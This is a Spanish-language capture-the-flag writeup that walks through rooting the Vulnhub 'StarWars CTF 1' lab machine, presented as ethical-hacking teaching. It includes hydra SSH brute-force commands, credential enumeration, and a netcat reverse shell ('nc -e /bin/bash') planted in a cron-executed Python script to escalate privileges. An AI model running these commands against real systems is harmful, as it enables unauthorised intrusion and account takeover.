---
title: "Writeup StarWars CTF 1"
header:
  image: /assets/images/posts/starwars1/featured_image.jpg
  teaser: /assets/images/posts/starwars1/featured_image.jpg
excerpt_separator: "<!--more-->"
show_date: true
last_modified_at: 2025-12-09T16:20:02-05:00
toc: true
toc_sticky: true
share: true
related: true
categories:
  - writeups
  - Vulnhub
tags:
  - Burp Suite
  - Reverse Shell
  - gobuster
  - zsteg
  - dirb
  - hydra
  - cewl
collection: writeups
---

En este writeup, resolveré la máquina **StarWars CTF 1** de **Vulnhub**, documentando cada paso y técnica empleada durante el proceso. A lo largo de este análisis, cubriré desde la recolección de información inicial hasta la explotación de vulnerabilidades y la escalada de privilegios, detallando las herramientas utilizadas y los métodos aplicados.

El objetivo es proporcionar una guía detallada para aquellos interesados en aprender sobre técnicas de pentesting y hacking ético, a través de un enfoque práctico y exhaustivo. Cada etapa del proceso será explicada en detalle para facilitar la comprensión de los desafíos encontrados y las soluciones implementadas. Este writeup está diseñado tanto para novatos como para usuarios avanzados que deseen mejorar sus habilidades en la resolución de máquinas de CTF.

```
 ____  _              __        __             
/ ___|| |_ __ _ _ __  \ \      / /_ _ _ __ ___ 
\___ \| __/ _` | '__|  \ \ /\ / / _` | '__/ __|
 ___) | || (_| | |      \ V  V / (_| | |  \__ \
|____/ \__\__,_|_|       \_/\_/ \__,_|_|  |___/
                                               
```

| **Name:**         | Star Wars CTF: 1                                   |
| ----------------- | -------------------------------------------------- |
| **Date release**: | 1 Aug 2020                                         |
| **Author:**       | Sir Logic                                          |
| **Series:**       | Star Wars CTF                                      |
| **Style**:        | Enumeration/Follow the breadcrumbs                 |
| **Goal**:         | get root (uid 0) and read the flag file            |
| **Difficulty**:   | Easy                                               |
| **Web page:**     | https://www.vulnhub.com/entry/star-wars-ctf-1,528/ |

## Descripción

Star Wars themed CTF for beginners
This works better with VirtualBox rather than VMware

## Resolucion de la maquina

Vamos a obtener acceso de root en una máquina de VulnHub llamada "Star Wars CTF 1". 

Contiene una bandera que es accesible tras obtener privilegios de root en la máquina. Fue desarrollada por el equipo Sir Logic, y el nivel de dificultad de esta máquina es para principiantes. 

Nuestro objetivo es obtener acceso de root.

Para resolver esta maquina uso las siguientes tecnologias:

- **Reconocimiento**
  - netdiscover
  - Nmap

- **Enumeracion**
  - gobuster
  - dirb

- **Explotación**
  - Zsteg
  - hydra
  - Inicio de sesión SSH

- **Post-Explotación**
  - Enumeracion local
  - cewl 
  - hydra
  
- **Escalada de Privilegios**
  - Post-enumeración
  - Abuso de scripts con permisos de escritura
  - Acceso como root

### Fase de Fingerprinting / Reconocimiento (Reconnaissance)

Comienzo con el reconocimiento de la máquina vulnerable usando `netdiscover`. Con este comando, puedo identificar la dirección IP de los dispositivos en la red y encontrar la IP de nuestra máquina objetivo.

```bash
netdiscover -r 192.168.88.0/24 -i eth0
```

![alt text](/assets/images/starwars1/image-34.png)

Obtengo la IP objetivo de la máquina: `192.168.88.6`

Ahora que conozco la IP objetivo, la almaceno en una variable para su uso 

```sh
export IP=192.168.88.6
```

### Enumeracion

Voy a escanear la IP con Nmap para recopilar información sobre el host objetivo.

En primer lugar voy a extraer los puertos disponibles en la maquina objetivo y los guardo en una variable.

```sh
nmap -p- $IP | awk '{print $1}' | grep -E '^[0-9]+' | cut -d'/' -f1 | paste -sd, - > puertos.txt
cat puertos.txt
export PORTS=22,80
```

Solo hay dos puertos abiertos: 22 y 80.

En el siguiente comando, hago un escaneo de versiones sobre los puertos detectados y compruebo el sistema operativo y guardo todo el contenido en ficheros.

```sh
nmap -sS -sV -p$PORTS $IP -O -oA /home/kali/Labs/StarWars/scan_nmap_$IP
```

| PORT   | STATE | SERVICE | VERSION                                        |
| ------ | ----- | ------- | ---------------------------------------------- |
| 22/tcp | open  | ssh     | OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0) |
| 80/tcp | open  | http    | Apache httpd 2.4.38 ((Debian))                 |

Sistema operativo: Linux 4.X|5.X



Dado que el puerto 80 está abierto, exploro la página web en esta IP objetivo usando un navegador.

![alt text](/assets/images/starwars1/image-35.png)

Reviso el código fuente de la página obteniendolo mediante la herramienta curl.

![alt text](/assets/images/starwars1/image-36.png)

En el código fuente, el autor dejó una pista sobre la contraseña: “la contraseña está aquí”, seguida de un texto que indica una contraseña oculta.

![alt text](/assets/images/starwars1/image-37.png)

Intento  descodificacion suponiendo que esta codificado en base64 al acabar con el simbolo "="

![alt text](/assets/images/starwars1/image-8.png)

Este intento no me lleva a ningun sitio. 

Sigo investigando la pagina web y descargo las imagenes de la pagina pensando que pudieran contener datos ocutlos. 


```sh
wget http://192.168.88.5:80/images/yoda.png
wget http://192.168.88.5:80/images/yoda.jpg
```

![alt text](/assets/images/starwars1/image-38.png)

Compruebo informacion exif de las imagenes.

![alt text](/assets/images/starwars1/image-39.png)

![alt text](/assets/images/starwars1/image-40.png)

Para comprobar datos ocultos en archivos png y bmp suelo usar la herramienta zsteg que puedes encontrar en el repositorio de github https://github.com/zed-0xff/zsteg

La instalacion se realiza con:

```sh
gem install zsteg
```

![alt text](/assets/images/starwars1/image-41.png)

Compruebo la imagen PNG con la herramienta zsteg.

![alt text](/assets/images/starwars1/image-42.png)

Obtengo el siguiente texto oculto: 

```
the real password is babyYoda123
```

>Otra forma de llegar a obtener este texto es mediante herramientas de esteganografía online como https://stylesuxx.github.io/steganography/ donde puedes subir la imagen y pulsar sobre Decode Image y obtendras el texto anterior.

![alt text](/assets/images/starwars1/image-16.png)

#### Enumeracion Web

Para la enumeracion web una herramienta muy potente es `gobuster`. La instalo en mi maquina atacante. 

![alt text](/assets/images/starwars1/image-43.png)

Para sacarle buen partido necesito tambien unos diccionarios buenos. Para la enumeracion suelo usar los diccionarios que nos ofrece `seclists`. Se pueden instalar en la maquina directamente con `apt-get install seclist`

![alt text](/assets/images/starwars1/image-44.png)

Una vez instalados estan listos para ser usados.

![alt text](/assets/images/starwars1/image-45.png)

Lanzo gobuster contra la pagina web usando el diccionario de contenido web `directory-list-lowercase-2.3-big.txt`

```sh
gobuster dir -u http://192.168.88.6 -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-big.txt -x .js .txt .html .htm .php
```

![alt text](/assets/images/starwars1/image-47.png)

Completo la enumeracion lanzando tambien dirb

```sh
dirb http://$IP/ -X ,.php,.html,.js,.txt
```

![alt text](/assets/images/starwars1/image-51.png)

![alt text](/assets/images/starwars1/image-52.png)

He encontrado algunos directorios y ficheros que es interesante revisar.

```sh
/robots.txt     http://192.168.88.5/robots.txt
/images         http://192.168.88.5/images/
/users.js       http://192.168.88.5/users.js
/admin          http://192.168.88.5/admin
/wordpress      http://192.168.88.5/wordpress
/manual         http://192.168.88.5/manual
/javascript     http://192.168.88.5/javascript/
/server-status  http://192.168.88.5/server-status
/r2d2           http://192.168.88.5/r2d2
```

- /robots.txt.

![alt text](/assets/images/starwars1/image-53.png)

```
Why does the Jedi Order keep checking the robots.txt file.
Might take a look at /r2d2
He is the real OG. 
```

En este archivo nos indica que revisemos el archivo `r2d2`. 

- /r2d2

![alt text](/assets/images/starwars1/image-54.png)

El archivo r2d2 es un texto. 

![alt text](/assets/images/starwars1/image-55.png)

Guardo el texto para revisarlo con mas detenimiento o por si hace falta mas adelante. 


- /admin

Al acceder a admin obtengo una web con un login que me indica que intente acceder bajo mi propio riesgo.

![alt text](/assets/images/starwars1/image-58.png)

Al pulsar login me abre un modal donde hacer login

![alt text](/assets/images/starwars1/image-59.png)

- /wordpress

![alt text](/assets/images/starwars1/image-57.png)

- Archivo users.js

![alt text](/assets/images/starwars1/image-56.png)

Obtengo nombres de usuario:

```
skywalker
han
```

Ahora que he obtenido unos usuarios y tengo la clave anterior, puedo probar el modal de login anterior.

uso las combinaciones 

skywalker:babyYoda123
han:babyYoda123

Ambos intentos me llevan a action_page.php pero recibo un "Not Found".

![alt text](/assets/images/starwars1/image-60.png)

Explotacion de servicio SSH

Realizo un ataque de fuerza bruta al servicio SSH con los usuarios y la clave encontrada. Aunque los nombres de usuario son 2 y solo tengo una password y podria probarlo manualmente prefiero hacer un ataque con hydra para no perder el habito y olvidar su uso.

Guardo los usuarios en un fichero de texto llamado `users.txt`

curl http://192.168.88.6/users.js > users.txt
cat users.txt

![alt text](/assets/images/starwars1/image-61.png)

Lanzo el ataque con hydra:

```sh
hydra -L users.txt -p babyYoda123 192.168.88.6 ssh
```

![alt text](/assets/images/starwars1/image-62.png)

He obtenido que el login es valido para han:babyYoda123

Compruebo el acceso por SSH

![alt text](/assets/images/starwars1/image-63.png)

### Post-Explotacion

#### Enumeracion Local de la maquina objetivo

Una vez que he conseguido hacer login en la maquina con un usuario legitimo, el paso mas logico es comprobar la maquina desde dentro, por lo que hare una enumeracion local.

##### Enumeracion sistema

Enumero el sistema con los siguientes comandos:

```sh
hostname
cat /etc/*release
uname -a
df -h
```

![alt text](/assets/images/starwars1/image-67.png)

![alt text](/assets/images/starwars1/image-68.png)

##### Enumeracion usuarios

Enumero usuarios con los siguientes comandos:

cat /etc/passwd | grep sh
lastlog | grep -v "Never"

![alt text](/assets/images/starwars1/image-65.png)

Encuentro que ademas de el usuario `han` existen los usuarios `skywalker` y `Darth` que han hecho login en la maquina.

##### Enumeracion de archivos

Compruebo el contenido de la carpeta home del usuario `han`.

![alt text](/assets/images/starwars1/image-69.png)

Hay una carpeta .secrets que es interesante.

Compruebo su contenido y obtengo un fichero note.txt que indica que "Anakin is a cewl kid."

![alt text](/assets/images/starwars1/image-70.png)

Encontrar la palabra cewl me sugiere usar dicha herramienta para generar una lista de palabras.

Uso cewl con el texto que encontre en `http://192.168.88.6/r2d2` para crear un diccionario

```sh
cewl http://192.168.88.6/r2d2 > dict_r2d2.txt
```

![alt text](/assets/images/starwars1/image-72.png)

Obtengo un diccionario de 328 palabras.

Lanzo un ataque de fuerza bruta con este diccionario con el usuario skywalker para el acceso por SSH.

```sh
hydra -l skywalker -P dict.txt 192.168.88.6 ssh
```

![alt text](/assets/images/starwars1/image-73.png)

Obtengo una credencial valida para el acceso por SSH `skywalker:tatooine`

Accedo al sistema objetivo con las credenciales obtenidas

![alt text](/assets/images/starwars1/image-74.png)

Realizo una enumeracion de ficheros

pwd
ls -lisah
cd .secrets/


![alt text](/assets/images/starwars1/image-76.png)

ls -lisah
cat note.txt

![alt text](/assets/images/starwars1/image-77.png)

Consigo el texto

```
Darth must take up the job of being a good father
```

#### Escalada de Privilegios

Anteriormente vi que Darth habia hecho login en el sistema asi que investigo si tiene una carpeta de trabajo.

![alt text](/assets/images/starwars1/image-79.png)

Cambio al directorio de trabajo de Darth y compruebo su contenido.

![alt text](/assets/images/starwars1/image-80.png)

Veo que existe un directorio `.secrets`. Compruebo su contenido y obtengo un fichero llamado `evil.py`.

![alt text](/assets/images/starwars1/image-82.png)

Este fichero parece indicar que "Deja que el miedo fluya a través de ti cada minuto." Es decir que debe ejecutarse algo cada minuto en la maquina, lo que me indica que hay un trabajo en cron cada minuto.


Voy a abusar de que este fichero evil.py se ejecuta cada minuto para lanzar una shell reversa contra mi maquina atacante mediante el uso de netcat. 

Edito el archivo evil.py con el comando:

```sh
nano evil.py
```
Mi maquina atancante tiene la IP 192.168.88.3 y selecciono el puerto 7331 que esta libre. Con estos datos añado las lineas:

```
import os
os.system("nc -e /bin/bash 192.168.88.3 7331")
```

![alt text](/assets/images/starwars1/image-84.png)

En una nueva terminal, ejecuto un listener de Netcat para obtener la conexión inversa.

nc -nlvp 7331

![alt text](/assets/images/starwars1/image-85.png)

Tras esperar un minuto obtengo una shell en el sistema con el usuario Darth.

![alt text](/assets/images/starwars1/image-87.png)

Uso un one-liner en Python para obtener una shell TTY mas comoda 

python -c 'import pty; pty.spawn("/bin/bash")'

![alt text](/assets/images/starwars1/image-88.png)

A continuacion compruebo los permisos que Darth tiene sobre binarios del sistema.

sudo -l

![alt text](/assets/images/starwars1/image-89.png)

Indica que Darth puede usar nmap como root sin necesidad de clave.


Compruebo en gtfobins si hay escalacion de privilegios por sudo en el comando nmap y veo que es posible.

![alt text](/assets/images/starwars1/image-93.png)


Compruebo que version de nmap esta instalada en el sistema objetivo y nos indica que es la version 7.70

![alt text](/assets/images/starwars1/image-91.png)

Ya que la version que existe es superior a la 5.21 pruebo la opcion (a)

![alt text](/assets/images/starwars1/image-92.png)

Y he obtenido el root del sistema.

Busco la flag y la localizo en /root.

Dejo mi firma dentro de la flag.

![alt text](/assets/images/starwars1/image-94.png)
